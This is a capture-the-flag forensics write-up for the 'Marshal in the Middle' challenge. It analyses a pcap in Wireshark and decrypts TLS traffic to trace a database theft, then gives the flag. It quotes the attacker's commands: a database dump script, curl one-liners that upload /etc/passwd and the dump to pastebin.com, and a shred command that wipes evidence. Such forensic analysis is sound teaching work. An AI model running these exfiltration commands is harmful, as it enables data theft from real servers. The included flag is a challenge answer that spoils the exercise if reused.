# Marshal in the Middle
> Write-up author: jon-brandy
## DESCRIPTION:
The security team was alerted to suspicous network activity from a production web server.
Can you determine if any data was stolen and what it was?
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209421504-7bddc062-2ab0-4957-8a1c-79f5146d4249.png)


2. Open the `.pcap` file in wireshark.

![image](https://user-images.githubusercontent.com/70703371/209421555-d456277e-ec19-45f0-a66f-347888ba5ba7.png)


3. Now let's follow the `tcp` stream.
4. When i followed the 2nd tcp stream. Got a clue here.

![image](https://user-images.githubusercontent.com/70703371/209457019-4fbdaa88-c5f9-4ecc-944d-500d376dd077.png)


![image](https://user-images.githubusercontent.com/70703371/209457055-00664966-81c8-42b3-b7f4-17fff62905ed.png)


![image](https://user-images.githubusercontent.com/70703371/209457068-4d13d925-a145-4aac-9e32-75910b09d3af.png)


5. Based from it we know that the attacker checked connectivity to a database server, then used a script named exfildb.sh to dump the remote database.

```sh
./exfildb.sh mysql-m1.prod.htb 3306 root p4ssw0rd dbdump
```

6. Then the attacker tried to upload the contents of `etc/passwd` to pastebin.com using **curl**.

```sh
pastetext=$(cat /etc/passwd) ; curl -d "api_user_key=ed67c1aec48d47270dd002d0baa29814&api_dev_key=bb8aa307a7d4b6073976149b65977bae&api_paste_private=2&api_option=paste&api_paste_code=${pastetext}" 'https://pastebin.com/api/api_post.php'
```

7. Seems like the attacker tried to upload contents of `etc/passwd` again.

![image](https://user-images.githubusercontent.com/70703371/209457217-9300ece2-2e88-4b81-b866-633ab61ee40d.png)


8. Next, the attacker used **head** to check the first four lines of the `dumpdb` file.

![image](https://user-images.githubusercontent.com/70703371/209457232-ae2da664-198c-4ceb-985e-58547bfd9a31.png)


9. Then he used **curl** again to upload the database of pastebin.com.

![image](https://user-images.githubusercontent.com/70703371/209457243-1cad3ecc-b9ea-4404-a68d-a843cbc0e1eb.png)


```sh
pastetext=$(cat dumpdb) ; curl -d "api_user_key=ed67c1aec48d47270dd002d0baa29814&api_dev_key=bb8aa307a7d4b6073976149b65977bae&api_paste_private=2&api_option=paste&api_paste_code=${pastetext}" 'https://pastebin.com/api/api_post.php'
```

10. After that, the attacker tried to remove all the tools and dumped database from `tmp/.h4x` directory.

![image](https://user-images.githubusercontent.com/70703371/209457272-96bcd57b-4cc0-453e-8aa5-cb668d68d390.png)


```sh
find /tmp/.h4x -type f -exec shred -vfun2  {} \;
```

11. The next thing to do is to check what was uploaded to pastebin.com.
12. First, we need to upload the `secrets.log` file we got from extracting the zip file as the TLS (Pre)-Master-Secret log filename, because we want to decrypt the encrypted HTTPS traffic.

> STEPS

```
Go to edit -> preferences -> protocols -> TLS -> upload.
```

13. Now let's filter the http stream which has pastebin.com as the host.

> COMMAND

```
http.host=="pastebin.com"
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209457412-69950c44-a246-4dbe-9f27-8627e1835fcd.png)


14. After follow the 1st and the 2nd HTTP stream, i got nothing useful.
15. But when i followed the 3rd one, i got the flag!

![image](https://user-images.githubusercontent.com/70703371/209457425-3566d937-cf65-4491-a893-3f63a719fcdc.png)


## FLAG

```
HTB{Th15_15_4_F3nD3r_Rh0d35_M0m3NT!!}
```




